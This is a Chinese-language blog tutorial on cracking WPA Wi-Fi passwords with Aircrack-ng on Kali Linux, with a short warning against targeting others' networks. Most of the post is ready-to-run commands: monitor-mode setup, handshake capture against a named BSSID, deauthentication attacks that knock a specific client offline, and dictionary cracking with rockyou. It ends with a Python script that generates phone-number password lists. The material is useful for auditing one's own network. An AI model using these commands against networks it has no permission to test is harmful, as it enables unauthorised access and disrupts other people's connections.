---
title: 使用 Aircrack-ng 破解 WI-FI 密码
abbrlink: 6e155fd
date: 2025-11-02 21:30:02
updated: 2025-11-02 22:36:33
tags:
  - kali
  - linux
---

## 说在前面

**不建议在未经允许的情况下破解他人的 Wi-Fi，建议使用自己的 Wi-Fi 测试。**

本方案的原理：监听目标 Wi-Fi，同时对目标 Wi-Fi 发起攻击，使正常连接该 Wi-Fi 的设备断线，断线后设备会尝试重新连接 Wi-Fi，此时会发送包含加密过的密码的握手包，我们就能抓取到发送该握手包，再用字典中的密码挨个按照相同加密方式去匹配抓到的握手包。

简而言之：最后能不能成功还是依赖于字典，只有 Wi-Fi 密码刚好在字典中存在才能有机会匹配到，不存在那就没戏了，暴力破解就是这样子的，全靠运气和莽 😂。

## 准备测试环境

### 1. 检查无线网卡是否支持监听模式

如果自己电脑物理机装的就是 Linux 系统，直接执行 iw list，检查输出是否有“monitor”字样，如果没有，需要自行准备支持监控模式的 USB 网卡之类的东西，我用的是在淘宝买的 MT7921 USB 无线网卡。

```bash
iw list

# ...
#Supported interface modes:
#         * managed
#         * AP
#         * AP/VLAN
#         * monitor # 监控模式
#         * P2P-client
#         * P2P-GO
# ...
```

### 2. 准备测试环境

在你的 Linux 系统中安装 [Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) 工具包，或者直接去 [镜像站](https://mirrors.cernet.edu.cn/kali-images/current/) 下载 Live 版的 Kali Linux 系统镜像（比如 `kali-linux-2025.3-live-amd64.iso`），自行制作系统盘，然后引导进入 Live 环境进行后面的操作，如果你是用的 USB 无线网卡，也可以用虚拟机测试，USB 无线网卡可以很方便的直接连接到虚拟机。

如果你用的是 Windows，只建议使用虚拟机 + 无线网卡的方案，不建议尝试直接在 Windows 运行 Aircrack-ng，兼容性不好。

## 测试步骤

### 1. 网卡切换到监听模式

```bash
airmon-ng start wlan0
```

### 2. 清理干扰进程，防止接口被恢复为托管模式

```bash
airmon-ng check kill
```

### 3. 列出附近的 Wi-Fi 网络，记下目标 Wi-Fi 的 BSSID 和 CH（信道）

```bash
airodump-ng wlan0mon
```

注意这里的无线网卡名称是  `wlan0mon`, 而不是  `wlan0`。因为刚刚开启了监听 (monitor) 模式。

### 4. 监听目标 Wi-Fi

```bash
airodump-ng --bssid 2C:B2:1A:22:51:86 -c 3 -w ~/Wi-Fi_capture wlan0mon
```

### 5. 发送 Deauthentication 攻击

为了加速握手包的捕捉，可以发送 Deauthentication 攻击，让目标设备断线并重新连接

```bash
# 攻击无线AP
# aireplay-ng --deauth 10 -a 2C:B2:1A:22:51:86 wlan0mon

# 攻击客户端(-c 后面跟的是客户端mac地址)
aireplay-ng --deauth 10 -a 2C:B2:1A:22:51:86 -c 9C:5A:81:2A:C1:49 wlan0mon
```

捕捉到握手包后就可以执行 `airmon-ng stop wlan0mon` 停止监控模式了

### 6. 使用字典破解 Wi-Fi 密码

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt Wi-Fi_capture-01.cap
```

这里使用的是 kali 自带的密码本，为提高成功概率，可把 -w 后面的 txt 文件换成自定义专用密码本。

## 进阶操作：制作自己的密码本

### 例 1. 制作包含所有本地手机号的密码本

```python
# 下面的两个前缀只是例子，请自行查找当地的号段，参考网站：https://telphone.cn/prefix/
prefixes = ['1850006', '1301101']

def generate_phone_numbers(file_name):
    with open(file_name, 'w') as file:
        for prefix in prefixes:
            for i in range(10000):  # 后四位从0000到9999递增
                phone_number = f"{prefix}{i:04d}"  # 格式化为11位
                file.write(f"{phone_number}\n")

                # 加上其他前缀后缀
                for j in ('A','a'):
                    phone_number = f"{j}{prefix}{i:04d}"
                    file.write(f"{phone_number}\n")
                    phone_number = f"{prefix}{i:04d}{j}"
                    file.write(f"{phone_number}\n")

# 调用函数生成并写入文件
generate_phone_numbers('phone_numbers.txt')
```
